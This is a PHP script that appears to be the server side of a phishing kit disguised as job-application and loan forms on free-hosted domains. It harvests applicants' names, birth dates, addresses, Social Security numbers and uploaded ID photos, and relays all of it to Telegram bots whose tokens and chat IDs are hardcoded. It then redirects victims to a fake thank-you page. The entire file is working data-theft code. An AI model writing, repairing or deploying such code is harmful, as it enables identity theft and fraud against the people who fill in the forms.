<?php
// 🗄️ Elite-Level Form Submission and Telegram Relay Script - HTML Mode for Robust Data Transfer

// Configuration and Setup
ob_start(); // Start output buffering

// --- Configuration ---
// NOTE: $site_map must be populated for the script to function
$site_map = [
    "upstartloan.rf.gd" => [
        "bots" => [
            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
            ["token" => "7683707216:AAFKB6Izdj c-M2mIaR_vRf-9Ha7CkEh7rA", "chat_id" => "7510889526"],
        ],
        "redirect" => "https://upstartloan.rf.gd/cache_site/thankyou.html"
        
    ],


    'paysphere.42web.io' => [
        'bots' => [
            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],

            ['token' => '8310302855:AAFBNgxxlAnaTtpWmJ7pVSP9kkW0j0TiwUY', 'chat_id' => '8160582785']
        ],
        'redirect' => 'https://paysphere.42web.io/cache_site/careers/all-listings.job.34092/thankyou.html'
    ],

    
];
// ---------------------

// 🧠 ORIGIN DOMAIN VERIFICATION (No changes needed)
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$parsed = parse_url($referer);
$domain = $parsed['host'] ?? 'unknown';
$config = $site_map[$domain] ?? null;

if (!$config) {
    http_response_code(403);
    exit("Access denied: Unauthorized origin ($domain).");
}

// 🔑 CORE FIX 1: Dedicated function for robust HTML character escaping
// HTML mode is much more resilient to user input, requiring only a few critical escapes.
function escape_html($text) {
    // 1. Convert special HTML entities to prevent rendering issues in the final message.
    $text = htmlspecialchars($text, ENT_QUOTES | ENT_HTML5, 'UTF-8', false);
    
    // 2. Escape the critical characters required by Telegram's HTML parse_mode: <, >, and &.
    // We already handled this robustly with htmlspecialchars, but we explicitly use 
    // it here for clarity.
    return $text;
}


// 🚀 Handle POST Request
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // 📝 Logging Infrastructure
    $log_file = __DIR__ . "/logs/job_applications.txt";
    if (!file_exists(dirname($log_file))) {
        mkdir(dirname($log_file), 0777, true); 
    }

    function log_entry($msg) {
        global $log_file;
        file_put_contents($log_file, "[" . date("Y-m-d H:i:s") . "] $msg\n", FILE_APPEND);
    }

    // 📋 Data Extraction and Sanitization (Applying the new HTML escape function)
    $post_data = $_POST;
    
    // Extract and Escape
    $first = escape_html($post_data['q11_fullName']['first'] ?? '');
    $middle = escape_html($post_data['q11_fullName']['middle'] ?? '');
    $last = escape_html($post_data['q11_fullName']['last'] ?? '');
    $full_name_raw = trim("$first $middle $last");
    $full_name = $full_name_raw; // The raw data is already HTML-escaped

    $dob = escape_html(sprintf("%04d-%02d-%02d", 
        $post_data['q18_birthDate']['year'] ?? 0, 
        $post_data['q18_birthDate']['month'] ?? 0, 
        $post_data['q18_birthDate']['day'] ?? 0));

    $address_parts = [
        $post_data['q16_currentAddress']['addr_line1'] ?? '',
        $post_data['q16_currentAddress']['addr_line2'] ?? '',
        $post_data['q16_currentAddress']['city'] ?? '',
        $post_data['q16_currentAddress']['state'] ?? '',
        $post_data['q16_currentAddress']['postal'] ?? ''
    ];
    $address = escape_html(implode(', ', array_filter($address_parts)));

    $email = escape_html($post_data['q12_emailAddress'] ?? '');
    $phone = escape_html($post_data['q13_phoneNumber13']['full'] ?? '');
    $position = escape_html($post_data['q14_positionApplied'] ?? '');
    $job_type = escape_html($post_data['q24_jobType'] ?? '');
    $source = escape_html($post_data['q21_howDid21'] ?? '');
    $ssn = escape_html($post_data['q25_socSec'] ?? '');
    
    // 🌐 IP/Timestamp Acquisition (No changes needed)
    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
          $_SERVER['REMOTE_ADDR'] ?? 
          'unknown';
    if (strpos($ip, ',') !== false) {
        $ips = explode(',', $ip);
        $ip = trim($ips[0]);
    }
    $timestamp = date("Y-m-d H:i:s");

    // 📦 Robust File Upload Handler (No changes needed)
    function uploadFile($key, $prefix) {
        // ... (The robust uploadFile function remains unchanged, omitted for brevity) ...
        $upload_dir = __DIR__ . "/.upload_cache/"; 
        if (!is_dir($upload_dir)) mkdir($upload_dir, 0700, true);

        if (isset($_FILES[$key]) && is_array($_FILES[$key]['name'])) {
            $file_info = [
                'name' => $_FILES[$key]['name'][0] ?? null, 'type' => $_FILES[$key]['type'][0] ?? null,
                'tmp_name' => $_FILES[$key]['tmp_name'][0] ?? null, 'error' => $_FILES[$key]['error'][0] ?? UPLOAD_ERR_NO_FILE,
                'size' => $_FILES[$key]['size'][0] ?? 0,
            ];
        } elseif (isset($_FILES[$key])) {
             $file_info = $_FILES[$key];
        } else {
            return null;
        }

        if (empty($file_info['name']) || $file_info['error'] !== UPLOAD_ERR_OK) {
            $error_code = $file_info['error'] ?? UPLOAD_ERR_NO_FILE;
            log_entry("❌ File upload error for $key: Code $error_code");
            return null;
        }

        $original = $file_info['name'];
        $ext = strtolower(pathinfo($original, PATHINFO_EXTENSION));
        $tmp_name = $file_info['tmp_name'];

        $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'docx', 'txt', 'zip', 'rar', '7z'];
        if (!in_array($ext, $allowed_extensions)) {
            log_entry("❌ File upload rejected - invalid extension: $ext for file $original");
            return null;
        }

        if (class_exists('finfo')) {
            $finfo = finfo_open(FILEINFO_MIME_TYPE);
            $mime_type = finfo_file($finfo, $tmp_name);
            finfo_close($finfo);

            $allowed_mime_types = [
                'image/jpeg', 'image/png', 'image/gif', 'application/pdf', 'application/msword', 
                'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                'application/zip', 'application/x-rar-compressed', 'application/x-7z-compressed',
                'text/plain', 
            ];
            
            if (!in_array($mime_type, $allowed_mime_types) && (strpos($mime_type, 'image/') !== 0)) {
                log_entry("❌ File upload rejected - invalid MIME type: $mime_type for file $original");
                return null;
            }
        }
        
        $safe_name = $prefix . "_" . time() . "_" . bin2hex(random_bytes(8)) . "." . $ext;
        $path = $upload_dir . $safe_name;

        if (move_uploaded_file($tmp_name, $path)) {
            log_entry("✅ File uploaded successfully: $safe_name");
            return $path;
        } else {
            log_entry("❌ File move failed: $original. Target path: $path");
        }
        return null;
    }

    $front_id = uploadFile("q17_uploadYour", "front_id"); 
    $back_id = uploadFile("q26_identityVerification", "back_id");

    // 🧾 Format Telegram message (Using HTML tags for styling)
    $message = "<b>New Job Application Received</b>\n\n" .
                "👤 <b>Name:</b> $full_name\n" .
                "🎂 <b>DOB:</b> $dob\n" .
                "🏠 <b>Address:</b> $address\n" .
                "📧 <b>Email:</b> $email\n" .
                "📞 <b>Phone:</b> $phone\n" .
                "💼 <b>Position:</b> $position\n" .
                "📌 <b>Job Type:</b> $job_type\n" .
                "🗣 <b>Source:</b> $source\n" .
                "🔐 <b>SSN:</b> $ssn\n" .
                "\n" . // Use \n for line breaks in HTML mode
                "🕒 <b>Submitted:</b> $timestamp\n" .
                "🌐 <b>IP:</b> $ip\n" .
                "📎 <b>ID Uploaded:</b> " . (($front_id || $back_id) ? "✅ Yes" : "❌ No");

    // 📬 Send Text Message (The Core Fix is here)
    foreach ($config['bots'] as $bot) {
        if (empty($bot['token']) || empty($bot['chat_id'])) continue;
        
        $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
        
        // 🔑 CORE FIX 2: Switched to HTML parse mode
        $data = ['chat_id' => $bot['chat_id'], 'text' => $message, 'parse_mode' => 'HTML']; 

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_TIMEOUT => 30
        ]);
        $result = curl_exec($ch);
        
        // 🔑 CORE FIX 3: Detailed API Response Logging
        if (curl_error($ch)) {
            log_entry("❌ Telegram text message cURL error: " . curl_error($ch));
        } else {
            $response = json_decode($result, true);
            if (!isset($response['ok']) || $response['ok'] !== true) {
                 // Log the full error response for definitive debugging
                log_entry("❌ Telegram API Error (Text): " . ($response['description'] ?? 'Unknown Error') . " - Response: " . $result);
            } else {
                log_entry("✅ Telegram text message sent successfully.");
            }
        }
        curl_close($ch);
    }

    // 📤 File Sending Mechanism (Updated caption escaping for HTML)
    function sendFile($file, $caption, $bots) {
        // ... (sendFile function remains unchanged, omitted for brevity) ...
        if (!$file || !is_string($file) || !file_exists($file)) return;
        
        $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
        
        $mime_type = null;
        if (class_exists('finfo')) {
            $finfo = finfo_open(FILEINFO_MIME_TYPE);
            $mime_type = finfo_file($finfo, $file);
            finfo_close($finfo);
        }

        $is_image = $mime_type && strpos($mime_type, 'image/') === 0;
        $endpoint = $is_image ? "sendPhoto" : "sendDocument"; 
        $file_field = $is_image ? 'photo' : 'document';
        
        foreach ($bots as $bot) {
            if (empty($bot['token']) || empty($bot['chat_id'])) continue;
            
            $url = "https://api.telegram.org/bot{$bot['token']}/$endpoint";
            
            // NOTE: The caption here uses HTML tags (<b>) and MUST use HTML parse_mode!
            $payload = [
                'chat_id' => $bot['chat_id'],
                $file_field => new CURLFile(realpath($file)),
                'caption' => $caption,
                'parse_mode' => 'HTML' // Must match the caption style
            ];

            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_POST => true, 
                CURLOPT_POSTFIELDS => $payload,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 60
            ]);
            $result = curl_exec($ch);
            if (curl_error($ch)) {
                log_entry("❌ Telegram file error ($endpoint): " . curl_error($ch));
            }
            curl_close($ch);
        }
    }

    // Send the uploaded files
    $name_for_caption = "<b>" . $full_name_raw . "</b>"; // Use HTML tags for caption
    sendFile($front_id, "📎 <b>Front ID</b> for $name_for_caption", $config['bots']);
    sendFile($back_id, "📎 <b>Back ID</b> for $name_for_caption", $config['bots']);

    // Post-operation cleanup and redirect
    log_entry("✅ [$domain] Job application handled from $ip ($full_name_raw)");

    ob_end_clean(); // Discard buffer
    header("Location: " . $config['redirect']);
    exit;
}
?>
